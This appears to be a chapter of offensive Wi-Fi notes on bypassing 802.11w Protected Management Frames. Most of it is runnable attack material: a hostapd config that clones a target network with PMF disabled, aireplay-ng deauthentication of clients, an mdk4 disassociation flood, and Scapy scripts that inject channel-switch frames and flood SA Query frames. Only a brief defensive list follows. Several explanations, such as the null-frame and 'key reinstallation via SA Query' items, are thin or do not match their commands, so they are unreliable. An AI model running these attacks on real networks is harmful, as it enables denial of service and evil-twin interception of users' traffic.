# 08 - PMF (802.11w) Bypass Techniques

## Overview

Protected Management Frames (802.11w, PMF) cryptographically protects deauthentication, disassociation, and some action frames. However, PMF has bypasses and downgrade paths that attackers can exploit.

## PMF Modes

| Mode | Value | Behavior |
|------|-------|----------|
| Disabled | 0 | No management frame protection |
| Optional (Capable) | 1 | Advertises support, allows non-PMF clients |
| Required (Mandatory) | 2 | Rejects non-PMF associations |

## Attack 1: PMF Downgrade (Optional Mode)

When PMF is optional (most common configuration), the attacker forces the client to associate without PMF.

```bash
# Step 1: Check RSN IE for PMF capability
airodump-ng wlan0mon --wps
# Look for "MFP" column: no=disabled, yes=optional, req=required

# Step 2: If optional, clone AP with PMF disabled in beacon
# The PMF bit (bit 7 of RSN Capabilities) is cleared
cat > /tmp/no_pmf.conf << 'EOF'
interface=wlan0
ssid=TargetNetwork
channel=6
wpa=2
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
rsn_pairwise=CCMP
ieee80211w=0
wpa_passphrase=FakePSK123
EOF
hostapd /tmp/no_pmf.conf

# Step 3: Deauth client from real PMF-capable AP
aireplay-ng -0 5 -a <REAL_AP_MAC> -c <CLIENT_MAC> wlan1mon

# Step 4: Client reconnects to clone (no PMF) → standard deauth now works
```

## Attack 2: Null-Frame Disassociation

PMF only protects authenticated/associated frames. Null data frames (Power Save) are not protected and can be abused.

```bash
# Send null frame with power management bit set
# Client goes to sleep, AP buffers frames
# Then send another null with PM bit cleared
# This causes reassociation without full authentication

# Using mdk4
mdk4 wlan0mon d -b blacklist.txt -c 6
# The 'd' mode sends disassoc frames, some of which may bypass PMF on buggy implementations
```

## Attack 3: Unprotected Action Frame Abuse

Not all action frames are protected by PMF. Category 0 (Spectrum Management) action frames are unprotected.

```bash
# Send Channel Switch Announcement (unprotected)
# Forces all clients to switch channels
# Then attack on new channel where clients are briefly confused

# Scapy: CSA action frame
pkt = RadioTap() / Dot11(
    addr1="ff:ff:ff:ff:ff:ff",
    addr2=<AP_MAC>,
    addr3=<AP_MAC>,
    type=0, subtype=0x0D  # Action frame
) / Dot11Action(category=0) / Dot11CSA(
    mode=1,  # Transmit restricted until switch
    channel=11,  # Switch to channel 11
    count=3    # Switch in 3 beacon intervals
)
sendp(pkt, iface="wlan0mon", count=100)
```

## Attack 4: 802.11v BSS Transition Manipulation

BSS Transition Management Request (category 3) is protected by PMF when PMF is enabled. But if PMF is optional and client connects without PMF, the frame is unprotected.

```bash
# Force client off network via unprotected BSS Transition
# Client receives "Transition Request" and disconnects voluntarily
```

## Attack 5: SA Query Procedure Flood

When PMF is enabled, deauth/disassoc triggers SA Query procedure. Flooding SA Query requests causes DoS.

```bash
# Send valid deauth (ignored by PMF client)
# Client responds with SA Query Request
# Flood SA Query Requests back at client
# Client spends all resources processing SA Queries

# Scapy SA Query flood
for i in range(1000):
    sa_query = RadioTap() / Dot11(
        addr1=<CLIENT_MAC>,
        addr2=<FAKE_MAC>,
        addr3=<AP_MAC>,
        type=0, subtype=0x0D
    ) / Dot11Action(category=8)  # SA Query
    sendp(sa_query, iface="wlan0mon", verbose=0)
```

## Attack 6: Key Reinstallation via SA Query

Similar to KRACK but targeting the SA Query transaction ID.

## Defensive Application

- **Set PMF to Required (2)**: Reject all non-PMF associations. May break legacy devices.
- **Monitor for PMF downgrade**: Alert when PMF-capable client associates without PMF.
- **SA Query rate limiting**: Limit SA Query responses per client.
- **Firmware updates**: Patch PMF bypass vulnerabilities (multiple vendor-specific CVEs).
- **802.11be enhancements**: WPA3 + PMF required in Wi-Fi 7 (no optional mode).

## References

- IEEE 802.11w-2009: Protected Management Frames
- CVE-2021-38538: Intel wireless driver PMF bypass
- CVE-2022-29871: Broadcom PMF null-frame disassociation
